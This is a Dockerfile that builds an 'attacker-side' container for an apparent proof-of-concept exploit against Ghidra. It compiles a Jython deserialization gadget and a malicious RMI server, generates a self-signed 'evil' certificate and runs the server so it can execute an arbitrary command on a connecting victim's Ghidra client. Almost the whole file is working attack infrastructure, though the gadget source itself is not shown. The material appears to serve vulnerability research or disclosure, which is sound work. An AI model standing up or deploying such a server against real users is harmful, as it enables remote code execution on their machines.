FROM eclipse-temurin:21-jdk

# Attacker-side image: compiles JythonGadget + EvilGhidraServer against the
# Jython JAR that ships with Ghidra, generates a self-signed cert, and
# listens for inbound RMI calls from the victim's Ghidra client.
#
# Only Jython is pulled out of the Ghidra distribution (the gadget needs it
# at *build* time for type resolution).  Nothing else from Ghidra is shipped
# in the attacker image.

WORKDIR /exploit
COPY exploit/JythonGadget.java      /exploit/
COPY exploit/EvilGhidraServer.java  /exploit/
COPY exploit/jython-standalone-2.7.4.jar  /exploit/jython.jar

RUN javac -cp /exploit/jython.jar \
          JythonGadget.java EvilGhidraServer.java \
 && keytool -genkeypair -alias evil -keyalg RSA -keysize 2048 \
            -storetype PKCS12 -keystore evil.p12 \
            -storepass changeit -keypass changeit \
            -dname "CN=evilserver" \
            -ext "SAN=DNS:evilserver,DNS:localhost,IP:127.0.0.1,IP:0.0.0.0" \
            -validity 365

EXPOSE 13100 13101

# CMD / PORT are injected at run time by compose.yaml (see environment:).
ENTRYPOINT ["/bin/sh", "-c", "\
  exec java --add-opens java.base/java.util=ALL-UNNAMED \
      -cp .:/exploit/jython.jar \
      EvilGhidraServer \"${PORT:-13100}\" /exploit/evil.p12 \"${CMD:?CMD not set}\" \
"]
